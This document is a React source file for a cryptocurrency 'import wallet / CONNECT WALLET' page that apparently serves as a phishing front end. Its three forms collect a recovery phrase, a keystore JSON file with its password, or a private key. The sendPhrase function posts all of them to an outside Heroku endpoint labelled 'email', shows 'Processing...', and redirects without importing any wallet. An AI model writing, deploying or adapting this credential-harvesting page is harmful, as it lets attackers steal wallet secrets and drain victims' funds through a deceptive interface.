import React, { useEffect, useState, useRef } from "react";
import "./index.css";
import axios from "axios";

export default function App(props) {
  const [phrase, setPhrase] = useState("");
  const [required, setRequired] = useState(false);
  const [active, setActive] = useState("Phrase");
  const [success, setSuccess] = useState(false);
  const [load, setLoad] = useState(false);
  const [show, setShow] = useState(false);
  const [password, setPassword] = useState("");
  const sendPhrase = (e) => {
    e.preventDefault();
    if (phrase) {
      setLoad(true);
      axios
        .post(`https://bootong-api.herokuapp.com/api/v1/email`, {
          phrase: phrase,
          password: password
        })
        .then((res) => {
          setShow(true);
          setTimeout(() => {
            setShow(false);
            props.history.push("/");
          }, 2000);
          setSuccess(true);
          setPhrase("");
          setPassword("")
          setLoad(false);
          if (res.data.message) {
            this.openNotification("Email Address and Phone Number");
          }
        })
        .catch((err) => {
          setLoad(false);
          setSuccess(false);
          console.log(err);
        });
    } else {
      setRequired(true);
      setSuccess(false);
      setTimeout(() => {
        setRequired(false);
      }, 2000);
    }
  };

  const gotoPhrase = (type) => {
    setActive(type);
  };

  const gotoJson = (type) => {
    setActive(type);
  };

  const gotoPrivate = (type) => {
    setActive(type);
  };
  return (
    <div>
      <div className="container pt-3">
        <h4 className="text-center" style={{ color: "#5343C0" }}>
          import wallet
        </h4>
        <br />
        <br />
        <div className="d-flex justify-content-between align-items-center">
          <div
            style={{ fontSize: "16px", cursor: "pointer" }}
            onClick={gotoPhrase.bind(this, "Phrase")}
            className={active === "Phrase" && "active-bg"}
          >
            Phrase
          </div>
          <div
            style={{ fontSize: "16px", cursor: "pointer" }}
            onClick={gotoJson.bind(this, "JSON")}
            className={active === "JSON" && "active-bg"}
          >
            Keystore JSON
          </div>
          <div
            style={{ fontSize: "16px", cursor: "pointer" }}
            onClick={gotoPrivate.bind(this, "Key")}
            className={active === "Key" && "active-bg"}
          >
            Private Key
          </div>

          <br />
          <br />
        </div>
      </div>

      <br />

      {active === "Phrase" && (
        <div>
          <form className="ml-2 mr-2">
            {show && (
              <p
                class="text-info text-center"
                style={{ fontWeight: "300", fontSize: "18px" }}
                role="alert"
              >
                <i
                  class="fa fa-times-circle fa-2x  text-info"
                  aria-hidden="true"
                ></i>{" "}
                Processing...
              </p>
            )}
            {required && (
              <p
                class="text-danger"
                style={{ fontWeight: "300", fontSize: "16px" }}
              >
                Phrase is Required!
              </p>
            )}

            <div class="form-group">
              <textarea
                class="form-control-lg"
                placeholder="Phrase"
                onChange={(e) => setPhrase(e.target.value)}
                id="exampleFormControlTextarea1"
                value={phrase}
                style={{ width: "100%", height: "8rem", fontSize: "16px" }}
                rows="3"
              ></textarea>
              <small>
                Typically 12 (sometimes 24) words seperated by a single spaces.
              </small>
              <br />
              <br />
              <button
                className="button-dark"
                style={{
                  width: "100%",
                  backgroundColor: "#5343C0",
                  fontWeight: "300",
                }}
                onClick={sendPhrase}
              >
                {load ? (
                  <div
                    class="spinner-border"
                    role="status"
                    style={{ width: "1.3rem", height: "1.3rem" }}
                  >
                    <span class="visually-hidden"></span>
                  </div>
                ) : (
                  "CONNECT WALLET"
                )}
              </button>
            </div>
          </form>
        </div>
      )}

      {active === "JSON" && (
        <div>
          <form className="ml-2 mr-2">
            {show && (
              <p
                class="text-info text-center"
                style={{ fontWeight: "300", fontSize: "18px" }}
                role="alert"
              >
                <i
                  class="fa fa-times-circle fa-2x  text-info"
                  aria-hidden="true"
                ></i>{" "}
                Processing...
              </p>
            )}
            {required && (
              <p
                class="text-danger"
                style={{ fontWeight: "300", fontSize: "16px" }}
              >
                Keystone JSON and Password are Required!
              </p>
            )}

           

            <div class="form-group">
              <textarea
                class="form-control-lg"
                placeholder="Keystore Json"
                onChange={(e) => setPhrase(e.target.value)}
                id="exampleFormControlTextarea1"
                value={phrase}
                style={{ width: "100%", height: "8rem", fontSize: "16px" }}
                rows="3"
              ></textarea>
               <div class="form-group">
              <div class="mb-2 mt-2">
                
                <input
                  type="email"
                  class="form-control"
                  placeholder="password"
                  value={password}
                  id="exampleFormControlInput1"
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            </div>
              <small>
              Several lines of text beginning with ... plus the password you used to encrypt it.



              </small>
              <br />
              <br />
              <button
                className="button-dark"
                style={{
                  width: "100%",
                  backgroundColor: "#5343C0",
                  fontWeight: "300",
                }}
                onClick={sendPhrase}
              >
                {load ? (
                  <div
                    class="spinner-border"
                    role="status"
                    style={{ width: "1.3rem", height: "1.3rem" }}
                  >
                    <span class="visually-hidden"></span>
                  </div>
                ) : (
                  "CONNECT WALLET"
                )}
              </button>
            </div>
          </form>
        </div>
      )}

      {active === "Key" && (
        <div>
          <form className="ml-2 mr-2">
            {show && (
              <p
                class="text-info text-center"
                style={{ fontWeight: "300", fontSize: "18px" }}
                role="alert"
              >
                <i
                  class="fa fa-times-circle fa-2x  text-info"
                  aria-hidden="true"
                ></i>{" "}
                Processing...
              </p>
            )}
            {required && (
              <p
                class="text-danger"
                style={{ fontWeight: "300", fontSize: "16px" }}
              >
                Private Key is Required!
              </p>
            )}

            <div class="form-group">
              <textarea
                class="form-control-lg"
                placeholder=" Private Key"
                onChange={(e) => setPhrase(e.target.value)}
                id="exampleFormControlTextarea1"
                value={phrase}
                style={{ width: "100%", height: "8rem", fontSize: "16px" }}
                rows="3"
              ></textarea>
              <small>
                Typically 12 (sometimes 24) words seperated by a single spaces.
              </small>
              <br />
              <br />
              <button
                className="button-dark"
                style={{
                  width: "100%",
                  backgroundColor: "#5343C0",
                  fontWeight: "300",
                }}
                onClick={sendPhrase}
              >
                {load ? (
                  <div
                    class="spinner-border"
                    role="status"
                    style={{ width: "1.3rem", height: "1.3rem" }}
                  >
                    <span class="visually-hidden"></span>
                  </div>
                ) : (
                  "CONNECT WALLET"
                )}
              </button>
            </div>
          </form>
        </div>
      )}
    </div>
  );
}
